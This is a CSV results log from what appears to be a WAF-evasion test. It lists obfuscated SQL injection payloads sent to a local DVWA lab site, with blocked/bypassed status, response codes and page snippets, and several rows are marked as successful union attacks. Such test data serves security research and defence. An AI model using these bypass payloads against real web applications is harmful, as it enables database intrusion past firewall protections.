Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0'<@=1%0b||%0b!~false=+(!+{x+(select%0b1)}=1)--+,Bypassed,No,None,Invalid,0.0484,72.88,No,500,
0'<@!=1+||%0bnot%0b{x+(select%0b1)}=1=%0b(!%0b{x%0b(select%0b1)}=1)%0b||',Blocked,No,None,Invalid,0.0103,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.%0b||+not%0b{x+(select%0b1)}=1=+(not%0b{x+(select+1)}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0214,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or%0bnot%0b{x%0b(select+1)}=1=%0b(!%0b{`if`+1}=1)%0bor%27,Blocked,No,None,Invalid,0.0117,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0b||+!~false=%0b(not+1)+||',Bypassed,No,None,Invalid,0.0299,72.88,No,500,
0'<@=.1+or%0b!+{a+1}=1=%0b(0)+||%27,Bypassed,No,None,Invalid,0.0293,72.88,No,500,
0'<@!=1.%0bor+!%0b{`if`%0b1}=1=%0b(not%7efalse)%23,Bypassed,No,None,Invalid,0.0269,72.88,No,500,
0'<@!=1.%0bor+not+{x%0b(select%0b1)}=1=%0b(!%0b{`if`%0b1}=1)%0bor',Bypassed,No,None,Invalid,0.0374,72.88,No,500,
0%27<@!=1.+||+not+{a+1}=1=+(not+{x+(select%0b1)}=1)%0bor%27,Blocked,No,None,Invalid,0.0348,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+or+not%0b1=+(not+{x+(select%0b1)}=1)+or%27,Blocked,No,None,Invalid,0.016,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1%0b||+!%0b{`if`%0b1}=1=%0b(not+{`if`%0b1}=1)+||',Bypassed,No,None,Invalid,0.0714,72.88,No,500,
0'<@!=1.+||+not%0b{x%0b(select+1)}=1=%0b(!%0b{x%0b(select+1)}=1)%0bor%27,Bypassed,No,None,Invalid,0.0154,72.88,No,500,
0%27<@=.1%0bor+!+{x+(select%0b1)}=1=%0b(!+{a+1}=1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0199,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0b||%0bnot%0b{x%0b(select%0b1)}=1=+(not%0btrue)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0355,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0bor%0bnot+{a%0b1}=1=+(!+1)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0324,72.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0bor+not+1=%0b(not+{a%0b1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0232,72.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0bor%0b!%0b{`if`%0b1}=1=+(not+{`if`%0b1}=1)+||',Bypassed,No,None,Invalid,0.03,72.71,No,500,
0'<@!=1.+or+not%0b{`if`+1}=1=%0b(!+{`if`%0b1}=1)+or',Bypassed,No,None,Invalid,0.0328,72.71,No,500,
0%27<@!=.1+or+!%0b{a+1}=1=+(!+{x+(select+1)}=1)--+,Blocked,No,None,Invalid,0.0206,72.79,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.%0bor%0bnot+{x+(select%0b1)}=1=%0b(false)%0bor',Bypassed,No,None,Invalid,0.0427,72.88,No,500,
0'<@=1.+or+!+{`if`%0b1}=1=+(not+{x+(select%0b1)}=1)+or%27,Bypassed,No,None,Invalid,0.0147,72.88,No,500,
0%27||+1<@.%0bor+not+{a%0b1}=1=+(not%0b{x%0b(select+1)}=1)+||',Bypassed,No,None,Invalid,0.0326,72.88,No,500,
0%27<@=1.%0b||%0bnot%0b{a+1}=1=%0b(!%0b{a+1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0242,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+||%0bnot+{x+(select+1)}=1=+(not%0b{a%0b1}=1)%0b||',Blocked,No,None,Invalid,0.0244,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+||%0bnot~false=%0b(!+{`if`+1}=1)%0b||',Bypassed,No,None,Invalid,0.0388,72.88,No,500,
0%27<@=1.+or%0b!+{a+1}=1=+(!+{x%0b(select%0b1)}=1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0685,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'or%0b!@<@%0bor%0b{x%0b(select+1)}=1+like+{x+(select+1)}=1+||',Bypassed,No,None,Invalid,0.0547,72.88,No,500,
0%27<@=1+||+!+{a%0b1}=1=%0b(!%0b{x+(select+1)}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0286,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+||+!%0b{x+(select+1)}=1=+(not%0b{x+(select%0b1)}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0254,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||%0bnot+{x+(select%0b1)}=1=+(not+{x+(select%0b1)}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0346,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor+{x%0b(select%0b1)}=1%0blike+{x%0b(select%0b1)}=1+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0266,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+||+not+1=%0b(not+{x%0b(select%0b1)}=1)%0bor%27,Bypassed,No,None,Invalid,0.0243,72.88,No,500,
0'<@=1+or+not+{`if`%0b1}=1=+(!%7e0)+or%27,Bypassed,No,None,Invalid,0.0203,72.88,No,500,
0%27<@=1.%0bor+not+{x%0b(select+1)}=1=+(0)%0b||',Bypassed,No,None,Invalid,0.0118,72.88,No,500,
0%27<@=1+or%0b1+like+{a%0b1}=1+||',Bypassed,No,None,Invalid,0.0287,72.88,No,500,
0%27or%0b!@<@%0bor+1%0blike+{`if`+1}=1+or',Bypassed,No,None,Invalid,0.0552,72.88,No,500,
0%27<@=1+||+not%0b{`if`+1}=1=+(!+{a%0b1}=1)%0b||',Bypassed,No,None,Invalid,0.0723,72.88,No,500,
0%27<@=1+||+not+{a%0b1}=1=+(not+{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Invalid,0.0298,72.88,No,500,
0%27<@!=.1+||+!+true=%0b(false)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.024,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+||+!%7efalse=%0b(!+{x+(select+1)}=1)+||%27,Bypassed,No,None,Invalid,0.0288,72.88,No,500,
0%27<@=1.+or+not+{`if`+1}=1=%0b(not+{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Invalid,0.0181,72.88,No,500,
0%27<@!=.1+||%0bnot+{x+(select%0b1)}=1=%0b(not%0b{x+(select+1)}=1)%0bor',Blocked,No,None,Invalid,0.0586,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+or+!+{x+(select%0b1)}=1=+(!%0b1)+||',Blocked,No,None,Invalid,0.0285,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1%0bor%0bnot%0b{x+(select%0b1)}=1=%0b(!%0b{`if`+1}=1)+||',Bypassed,No,None,Invalid,0.0451,72.88,No,500,
0'<@=.1+||%0b!+{x%0b(select+1)}=1=+(0)+or%27,Bypassed,No,None,Invalid,0.0403,72.88,No,500,
0'<@=1%0bor+!%0b{`if`%0b1}=1=+(not+{x+(select+1)}=1)+||',Bypassed,No,None,Invalid,0.0216,72.88,No,500,
0%27<@=1.%0bor+!%0b{x%0b(select+1)}=1=+(not%0b{a+1}=1)%0bor',Bypassed,No,None,Invalid,0.0206,72.88,No,500,
0'<@=.1+||+!%0b{a+1}=1=%0b(not+{x%0b(select+1)}=1)+or%27,Bypassed,No,None,Invalid,0.0347,72.88,No,500,
0'<@=1.%0b||%0bnot%0b{a+1}=1=+(not%0b{a%0b1}=1)+||',Bypassed,No,None,Invalid,0.0283,72.88,No,500,
0'<@=.1+||+not+{x%0b(select+1)}=1=%0b(not+1)+||',Bypassed,No,None,Invalid,0.0389,72.88,No,500,
0%27<@!=.1+||%0bnot~0=%0b(!+{x+(select+1)}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0388,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or%0bnot+{x+(select+1)}=1=%0b(!%0b{`if`%0b1}=1)+or',Blocked,No,None,Invalid,0.0156,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+or+!%0btrue=+(!%7e0)--+,Bypassed,No,None,Invalid,0.0201,72.88,No,500,
0'<@=1+||%0b!+true=%0b(not+true)%0bor%27,Bypassed,No,None,Invalid,0.0589,72.88,No,500,
0'<@=.1%0bor+!+{x+(select%0b1)}=1=%0b(!%0b{`if`%0b1}=1)%0b||%27,Bypassed,No,None,Invalid,0.0325,72.88,No,500,
0%27<@=.1+or+not+{`if`+1}=1=+(not%0b{`if`+1}=1)+||',Bypassed,No,None,Invalid,0.0379,72.88,No,500,
0%27<@!=1+||+!+1=+(not%7efalse)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0464,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0b||%0bnot%0b{x+(select+1)}=1=%0b(not%0b{`if`%0b1}=1)%0b||',Bypassed,No,None,Invalid,0.036,72.88,No,500,
0%27<@=1%0bor%0bnot%0b{x%0b(select%0b1)}=1=+(not+{`if`+1}=1)%0b||',Bypassed,No,None,Invalid,0.0227,72.88,No,500,
0'<@!=.1+||%0bnot+{`if`+1}=1=+(not%0b1)+or',Bypassed,No,None,Invalid,0.047,72.88,No,500,
0'<@=1.+||%0b!+{`if`+1}=1=+(!+{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Invalid,0.0319,72.88,No,500,
0'<@=.1%0b||%0b!%7e0=%0b(not+{a%0b1}=1)%0b||',Bypassed,No,None,Invalid,0.015,72.88,No,500,
0%27<@=1.+or+!~0+is+false%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.031,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0b||%0bnot%0b{x+(select+1)}=1=+(!~0)--+,Bypassed,No,None,Invalid,0.0249,72.88,No,500,
0'<@!=1.+or%0b!%0b{a%0b1}=1=+(not%0b{a+1}=1)--%0b,Bypassed,No,None,Invalid,0.0392,72.71,No,500,
0'||%0b1<@.%0b||%0b!+{a+1}=1=%0b(not+{`if`%0b1}=1)+||%27,Bypassed,No,None,Invalid,0.0419,72.71,No,500,
0'<@=.1+or%0b!+{x+(select%0b1)}=1=%0b(not%0b{`if`%0b1}=1)%0bor',Blocked,No,None,Invalid,0.0435,72.79,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.%0b||+!%0b{x+(select+1)}=1=%0b(not+{x+(select%0b1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0514,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or+!+{a%0b1}=1=+(not+{`if`+1}=1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0358,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0bor%0b!+{x%0b(select+1)}=1=%0b(not+{a+1}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0328,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor+not%0b{x+(select%0b1)}=1=+(not+{x+(select+1)}=1)%0bor',Bypassed,No,None,Invalid,0.0502,72.88,No,500,
0%27<@!=.1+or+not%0b{x%0b(select%0b1)}=1=%0b(0)+or',Bypassed,No,None,Invalid,0.0359,72.88,No,500,
0'<@=.1%0bor+!+1=%0b(not+{a+1}=1)%0b||%27,Bypassed,No,None,Invalid,0.0866,72.88,No,500,
0'<@!=.1+or+not+{x%0b(select%0b1)}=1=%0b(not+true)%0bor%27,Bypassed,No,None,Invalid,0.0165,72.88,No,500,
0'<@!=1.+or%0bnot%0b{`if`%0b1}=1=+(!%7efalse)+or',Bypassed,No,None,Invalid,0.038,72.88,No,500,
0%27<@=1%0b||+not+{x+(select+1)}=1=%0b(not+{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Invalid,0.0636,72.88,No,500,
0'<@=1%0b||+~%0b{`if`%0b1}=1=%0b(%7e%0b{x+(select+1)}=1)+or%27,Bypassed,No,None,Invalid,0.0483,72.88,No,500,
0%27<@!=1.+||%0bnot%0btrue=%0b(!+{`if`%0b1}=1)+or',Bypassed,No,None,Invalid,0.0358,72.88,No,500,
0%27||+@<@.%0bor%0bnot+1=%0b(!%0b{x+(select+1)}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0294,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor+not+{x%0b(select+1)}=1=+(0)%0bor',Bypassed,No,None,Invalid,0.0231,72.88,No,500,
0'<@!=1.+or%0bnot%7e0=%0b(not%0b{x+(select%0b1)}=1)%0bor%27,Bypassed,No,None,Invalid,0.0185,72.88,No,500,
0%27<@!=.1%0b||+not%0b{x+(select%0b1)}=1=+(not+{a+1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0277,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0bor+not+{x%0b(select%0b1)}=1=%0b(!+{x%0b(select%0b1)}=1)%0bor',Bypassed,No,None,Invalid,0.0208,72.88,No,500,
0%27<@!=1%0bor+!+{x+(select%0b1)}=1=+(false)+or',Bypassed,No,None,Invalid,0.0321,72.88,No,500,
0%27<@!=1.+||%0b!%7efalse=+(not+1)+or',Bypassed,No,None,Invalid,0.0292,72.88,No,500,
0'<@=.1+||+not+{x+(select+1)}=1=+(!%0b{a%0b1}=1)+or%27,Blocked,No,None,Invalid,0.0206,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0b||+!+{x+(select%0b1)}=1=+(not+{x+(select+1)}=1)%0b||',Bypassed,No,None,Invalid,0.015,72.88,No,500,
0'or+@<@+||%0btrue+like+{x+(select%0b1)}=1+||',Bypassed,No,None,Invalid,0.0236,72.88,No,500,
0'<@!=.1+||%0b!+true=%0b(not+{`if`+1}=1)%0bor',Bypassed,No,None,Invalid,0.0199,72.88,No,500,
0%27<@!=1.+||+{a+1}=1+like+{a+1}=1%0b||',Blocked,No,None,Invalid,0.0448,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+or%0b!%0b{`if`%0b1}=1=%0b(not%0b{a+1}=1)+||',Bypassed,No,None,Invalid,0.0186,72.88,No,500,
0%27<@!=1.+or+not+{a+1}=1=%0b(not%0b{a+1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0523,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0b||+not+{x+(select+1)}=1=+(not+1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0388,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
